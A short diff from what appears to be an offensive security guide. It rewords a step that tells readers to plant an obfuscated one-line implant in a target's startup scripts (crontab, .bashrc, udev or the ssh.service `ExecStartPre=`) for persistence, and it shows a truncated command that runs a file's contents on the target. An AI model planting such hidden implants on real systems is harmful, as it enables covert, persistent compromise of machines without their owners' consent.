@@ -1895,7 +1895,7 @@ echo "===> Execute the following on the target:"$'\n\033[0;36m'"echo $(<x.txt)|b
 rm -f x.txt
 ```
 
-2. Add this 1-line implant to any startup script on the target (e.g. to [udev](https://www.aon.com/en/insights/cyber-labs/unveiling-sedexp) or `ExecStartPre=` in */usr/lib/systemd/system/ssh.service*). An clever example for ssh.service:
+2. Add the 1-line implant to any startup script on the target (use crontab, ~/.bashrc, [udev](https://www.aon.com/en/insights/cyber-labs/unveiling-sedexp) or `ExecStartPre=`). Here is a clever example for */usr/lib/systemd/system/ssh.service* (with some additional obfuscation):
 ```
 ...
 [Service]
